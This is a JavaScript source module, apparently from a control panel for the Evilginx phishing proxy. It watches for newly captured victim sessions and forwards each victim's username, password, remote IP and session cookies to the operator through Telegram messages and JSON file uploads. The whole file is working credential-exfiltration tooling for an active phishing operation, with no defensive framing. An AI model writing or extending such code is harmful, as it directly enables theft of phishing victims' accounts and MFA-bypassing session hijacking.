import { runAndParse } from './runCommand.js';
import { loadNotifyConfig, saveNotifyConfig, notifyConfigExists } from './notifyConfig.js';
import { sendTelegramMessage, sendTelegramDocument } from './telegramSender.js';
import { extractCookies } from './sessionCookies.js';

const POLL_MS = 15000;

function formatMessage(row) {
  return [
    '🎣 New Evilginx session captured',
    '',
    `Phishlet: ${row.phishlet}`,
    `Username: ${row.username}`,
    `Password: ${row.password}`,
    `Remote IP: ${row.remote_ip}`,
    `Session ID: ${row.id}`,
  ].join('\n');
}

async function maxSessionId() {
  const list = await runAndParse('sessions');
  return list.rows
    .filter((r) => r.id)
    .reduce((max, r) => Math.max(max, Number(r.id)), 0);
}

// Runs once at server boot so enabling notifications later doesn't trigger a
// flood of alerts for sessions captured before Telegram was ever configured.
export async function bootstrapNotifyState() {
  if (await notifyConfigExists()) return;
  try {
    await saveNotifyConfig({ lastSeenSessionId: await maxSessionId() });
  } catch {
    // evilginx may not be ready yet; the first watcher tick will just treat
    // whatever exists then as the baseline instead — a harmless one-time
    // edge case rather than a startup failure.
  }
}

async function checkOnce() {
  const cfg = await loadNotifyConfig();
  if (!cfg.enabled || !cfg.token || !cfg.chatId) return;

  const list = await runAndParse('sessions');
  const rows = list.rows.filter((r) => r.id);
  const maxId = rows.reduce((max, r) => Math.max(max, Number(r.id)), 0);
  const newRows = rows
    .filter((r) => Number(r.id) > cfg.lastSeenSessionId)
    .sort((a, b) => Number(a.id) - Number(b.id));

  for (const row of newRows) {
    try {
      await sendTelegramMessage(cfg.token, cfg.chatId, formatMessage(row));
      const detail = await runAndParse(`sessions ${row.id}`);
      const cookies = extractCookies(detail.raw);
      if (cookies && cookies.length > 0) {
        await sendTelegramDocument(
          cfg.token,
          cfg.chatId,
          `session-${row.id}-cookies.json`,
          JSON.stringify(cookies, null, 2),
          'Captured cookies'
        );
      }
    } catch (err) {
      console.error(`notify: failed to send Telegram alert for session ${row.id}:`, err.message);
    }
  }

  if (maxId > cfg.lastSeenSessionId) {
    await saveNotifyConfig({ lastSeenSessionId: maxId });
  }
}

let timer = null;
export function startSessionWatcher() {
  if (timer) return;
  timer = setInterval(() => {
    checkOnce().catch((err) => console.error('notify: watcher tick failed:', err.message));
  }, POLL_MS);
  timer.unref?.();
}
